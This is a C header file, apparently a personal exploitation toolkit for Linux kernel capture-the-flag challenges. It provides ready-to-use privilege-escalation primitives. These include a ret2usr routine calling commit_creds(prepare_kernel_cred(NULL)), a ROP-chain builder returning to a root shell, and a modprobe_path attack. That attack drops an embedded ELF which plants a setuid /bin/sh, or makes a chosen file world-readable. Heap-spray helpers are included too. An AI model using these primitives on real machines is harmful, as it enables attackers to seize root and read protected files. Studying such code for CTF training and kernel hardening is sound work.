// inspired by the goat: https://github.com/n132/libx/blob/main/libx.c
#define _GNU_SOURCE
#ifndef LIBPWN_H
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <pthread.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <stdint.h>
#include <errno.h>
#include <stddef.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <assert.h>
#include <sys/timerfd.h>
#include <sys/resource.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <netinet/tcp.h>  // for SOL_TCP, TCP options
#include <sys/prctl.h>
#include <poll.h>
#include <sys/shm.h>

size_t kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((size_t)(addr)-0xffffffff81000000 + kernel_base);
int fd;

#define TTY_FILE                        "/dev/ptmx"  
#define DEFAULT_MODPROBE_TRIGGER        "/tmp/fake"
#define DEFAULT_EVIL_MODPROBE_PATH      "/tmp/pwn"

#define SUCCESS_MSG(msg) "\033[32m\033[1m" msg "\033[0m"
#define INFO_MSG(msg) "\033[34m\033[1m" msg "\033[0m"
#define ERROR_MSG(msg) "\033[31m\033[1m" msg "\033[0m"
#define log_success(fmt, ...) printf(SUCCESS_MSG(fmt "\n"), ##__VA_ARGS__)
#define log_info(fmt, ...)    printf(INFO_MSG(fmt "\n"), ##__VA_ARGS__)
#define log_error(fmt, ...)   printf(ERROR_MSG(fmt "\n"), ##__VA_ARGS__)

typedef unsigned long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
size_t user_cs, user_ss, user_rflags, user_sp, user_rip;
size_t leak;

void error(const char *msg){
    printf(ERROR_MSG("[!] %s\n"), msg);
    exit(-1);
}

void spawn_shell() {
    log_info("Hello from user land!");
    uid_t uid = getuid();
    if (uid == 0) {
        printf(SUCCESS_MSG("[+] UID: %d, got root!\n"), uid);
        char *args[] = {"/bin/sh", NULL};
        char *env[] = {NULL};
        execve("/bin/sh", args, env); // Directly execute a shell
        error("execve failed"); // If execve fails, print error
    } else {
        printf(ERROR_MSG("[!] UID: %d, we are root-less :(!\n"), uid);
        exit(-1);
    }
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax");
    user_rip = (size_t)spawn_shell;
    log_success("[+] Saved state");
}


// ret2usr
size_t commit_creds = 0, prepare_kernel_cred = 0;

void* (*prepare_kernel_cred_kfunc)(void *task_struct);
int (*commit_creds_kfunc)(void *cred);


void ret2usr_attack(void)
{
    prepare_kernel_cred_kfunc = (void*(*)(void*)) prepare_kernel_cred;
    commit_creds_kfunc = (int (*)(void*)) commit_creds;

    (*commit_creds_kfunc)((*prepare_kernel_cred_kfunc)(NULL));

    asm volatile(
        "mov %%rax, %[ss]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[sp]\n\t"
        "sub %%rax, 8\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[rflags]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[cs]\n\t"
        "push %%rax\n\t"
        "mov %%rax, %[rip]\n\t"
        "push %%rax\n\t"
        "swapgs\n\t"
        "iretq\n\t"
        :
        : [ss]"r"(user_ss),
        [sp]"r"(user_sp),
        [rflags]"r"(user_rflags),
        [cs]"r"(user_cs),
        [rip]"r"(spawn_shell)
        : "rax"
    );
}

size_t *rop_commit(int i) {
    size_t pop_rdi = KADDR(0xffffffff8104b80d);
    size_t pop_rsi = KADDR(0xffffffff8104b80d);
    size_t pop_rcx = KADDR(0xffffffff8104b80d);
    size_t mov_rdi_rax = KADDR(0xffffffff8104b80d);

    size_t prepare_kernel_cred = KADDR(0xffffffff810b9c20);
    size_t commit_creds = KADDR(0xffffffff810b9970);
    size_t init_cred = KADDR(0xffffffff82a52fc0);
    size_t swapgs_restore_regs_and_return_to_usermode = KADDR(0xffffffff8200180c);

    static size_t fuzz[100] = {0};

    fuzz[i++] = pop_rdi;
    fuzz[i++] = 0;
    fuzz[i++] = prepare_kernel_cred;
    fuzz[i++] = pop_rcx;
    fuzz[i++] = 1;
    fuzz[i++] = pop_rsi;
    fuzz[i++] = 20;
    fuzz[i++] = mov_rdi_rax;
    fuzz[i++] = commit_creds;
    fuzz[i++] = swapgs_restore_regs_and_return_to_usermode + 22;
    fuzz[i++] = 0;
    fuzz[i++] = 0;
    fuzz[i++] = (size_t)spawn_shell;
    fuzz[i++] = user_cs;
    fuzz[i++] = user_rflags;
    fuzz[i++] = user_sp;
    fuzz[i++] = user_ss;
    return fuzz;
}

// modprobe_path attack
size_t modprobe_path;

void modprobe_setup(unsigned char *payload, size_t payload_len) {
    struct stat st = {0};
    log_info("Hello from user land!");
    if (stat("/tmp", &st) == -1) {
        log_info("[*] Creating /tmp");
        int ret = mkdir("/tmp", S_IRWXU);
        if (ret == -1) error("Failed to create /tmp");
    }

    FILE *fptr = fopen(DEFAULT_EVIL_MODPROBE_PATH, "w");
    if (fwrite(payload, payload_len, 1, fptr) != 1) error("Failed to write ELF payload");
    fclose(fptr);

    printf(SUCCESS_MSG("[+] Wrote win condition -> %s\n"), DEFAULT_EVIL_MODPROBE_PATH);

    fptr = fopen(DEFAULT_MODPROBE_TRIGGER, "w");
    if (!fptr) error("Failed to open dummy file");
    log_info("Writing dummy file...");
    if (fputs("\xff\xff\xff\xff", fptr) == EOF) error("Failed to write dummy file");
    fclose(fptr);
    
    printf(SUCCESS_MSG("[+] Wrote modprobe trigger -> %s\n"), DEFAULT_MODPROBE_TRIGGER);

    if (chmod(DEFAULT_EVIL_MODPROBE_PATH, 0777) < 0) error("Failed to chmod win condition");
    if (chmod(DEFAULT_MODPROBE_TRIGGER, 0777) < 0) error("Failed to chmod win condition");

    printf(INFO_MSG("[*] Triggering modprobe by executing %s\n"), DEFAULT_MODPROBE_TRIGGER);
    execv(DEFAULT_MODPROBE_TRIGGER, NULL);

}

void modprobe_attack_root(){
    // small ELF file matroshka doll that does;
    //   fd = open("/sh", O_WRONLY | O_CREAT | O_TRUNC);
    //   write(fd, elfcode, elfcode_len)
    //   chmod("/sh", 04755)
    //   close(fd);
    //   exit(0);
    //
    // the dropped ELF simply does:
    //   setuid(0);
    //   setgid(0);
    //   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
    unsigned char elfcode[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2e, 0x2f, 0x2f,
    0x2f, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
    };
    log_info("[*] Setting up to get root");

    modprobe_setup(elfcode, sizeof(elfcode));

    log_info("[?] Hopefully GG");
    system("/sh");
}

void modprobe_attack_read(char *filename){
    char arb_exec[256];

    snprintf(arb_exec, sizeof(arb_exec),
             "#!/bin/sh\n"
             "chmod 777 %s", filename);
    printf(INFO_MSG("[*] Setting up reading '%s:' as non-root user...\n"), filename);

    modprobe_setup((unsigned char *)arb_exec, strlen(arb_exec));

    log_info("[?] Hopefully GG");
    FILE *fptr = fopen(filename, "r");
    if (!fptr) error("Failed to open results file");

    char *line = NULL;
    size_t len = 0;
    for (int i = 0; i < 8; i++) {
        uint64_t read = getline(&line, &len, fptr);
        printf("%s", line);
    }

    fclose(fptr);

}


//for race condtion
void bind_cpu(int core)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

//msg_msg
int make_queue(key_t key, int msgflg){
    int result;
    if ((result = msgget(key, msgflg)) == -1) error("msgget failure");
    else return result;
}

void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg){
    if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0) error("msgrcv");
}

void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg){
    if (msgsnd(msqid, msgp, msgsz, msgflg) == -1) error("msgsend failure");
}


void dump_hex(char *buf, size_t size){
    for(int i = 0; i < size/8; i++){
        printf(SUCCESS_MSG("[+] %d - 0x%016lx\n"), i, ((unsigned long *)buf)[i]);
    }
}


void ppause(){
    log_info("enter to unpause");
    getchar();
}

void info(const char *msg, unsigned long val){
    printf(INFO_MSG("[*] %s: %p\n"), msg, val);
}



#endif /* LIBPWN_H */
